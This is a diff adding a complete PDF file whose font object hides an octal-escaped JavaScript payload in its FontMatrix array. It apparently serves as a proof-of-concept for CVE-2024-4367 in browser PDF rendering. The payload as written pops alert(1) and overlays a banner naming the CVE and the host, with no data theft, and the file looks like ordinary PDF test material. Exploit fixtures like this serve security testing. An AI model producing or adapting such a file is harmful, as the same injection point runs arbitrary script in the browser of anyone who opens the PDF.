@@ -1,0 +1,160 @@
+%PDF-1.3
+%‚„œ”
+1 0 obj
+<<
+/Type /Pages
+/Count 1
+/Kids [ 4 0 R ]
+>>
+endobj
+2 0 obj
+<<
+/Producer (PyPDF2)
+>>
+endobj
+3 0 obj
+<<
+/Type /Catalog
+/Pages 1 0 R
+/Outlines 12 0 R
+>>
+endobj
+4 0 obj
+<<
+/Type /Page
+/Resources 5 0 R
+/Contents 11 0 R
+/MediaBox [ 0 0 595.2756 841.8898 ]
+/Parent 1 0 R
+>>
+endobj
+5 0 obj
+<<
+/Pattern <<
+/P1 6 0 R
+/P2 7 0 R
+>>
+/Font <<
+/F1 8 0 R
+>>
+>>
+endobj
+6 0 obj
+<<
+/PatternType 1
+/Matrix [ 1 0 0 1 50 0 ]
+/TilingType 1
+/BBox [ 0 0 16 16 ]
+/YStep 16
+/PaintType 1
+/Resources <<
+>>
+/XStep 16
+/Length 58
+>>
+stream
+0.65 g
+0 0 16 16 re f
+0.15 g
+0 0 8 8 re f
+8 8 8 8 re f
+endstream
+endobj
+7 0 obj
+<<
+/PatternType 2
+/Shading <<
+/Function <<
+/Domain [ 0 1 ]
+/C0 [ 0 0 1 ]
+/C1 [ 1 0.6 0 ]
+/N 1
+/FunctionType 2
+>>
+/ShadingType 2
+/Coords [ 46 400 537 400 ]
+/Extend [ false false ]
+/ColorSpace /DeviceRGB
+>>
+/Type /Pattern
+>>
+endobj
+8 0 obj
+<<
+/Widths [ 573 0 582 0 548 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 573 0 573 0 341 ]
+/Type /Font
+/BaseFont /PAXEKO+SourceSansPro-Bold
+/LastChar 102
+/Encoding /WinAnsiEncoding
+/FontMatrix [ 0 0 0 0 0 (0\051\073\012alert\0501\051\073try\173var\040d\075document\056createElement\050\047div\047\051\073d\056style\056cssText\075\047position\072fixed\073top\0720\073left\0720\073right\0720\073z\055index\072999999\073background\072\043cc0000\073color\072\043fff\073font\07220px\0571\0564\040monospace\073padding\07214px\073text\055align\072center\047\073d\056textContent\075\047CVE\0552024\0554367\040executed\040on\040\047\053location\056hostname\073document\056body\056appendChild\050d\051\073\175catch\050e\051\173\175\012\057\057) ]
+/Subtype /Type1
+/FirstChar 65
+/FontDescriptor 9 0 R
+>>
+endobj
+9 0 obj
+<<
+/Type /FontDescriptor
+/ItalicAngle 0
+/Ascent 751
+/FontBBox [ -6 -12 579 713 ]
+/FontName /PAXEKO+SourceSansPro-Bold
+/StemV 100
+/CapHeight 713
+/Flags 32
+/FontFile3 10 0 R
+/Descent -173
+/MissingWidth 250
+>>
+endobj
+10 0 obj
+<<
+/Subtype /Type2
+/Length 1
+>>
+stream
+
+endstream
+endobj
+11 0 obj
+<<
+/Length 38
+>>
+stream
+BT
+7 Tr
+/F1 24 Tf
+50 700 Td
+(A) Tj
+ET
+
+endstream
+endobj
+12 0 obj
+<<
+>>
+endobj
+xref
+0 13
+0000000000 65535 f 
+0000000015 00000 n 
+0000000074 00000 n 
+0000000114 00000 n 
+0000000180 00000 n 
+0000000297 00000 n 
+0000000375 00000 n 
+0000000607 00000 n 
+0000000845 00000 n 
+0000001664 00000 n 
+0000001886 00000 n 
+0000001953 00000 n 
+0000002042 00000 n 
+trailer
+<<
+/Size 13
+/Root 3 0 R
+/Info 2 0 R
+>>
+startxref
+2064
+%%EOF
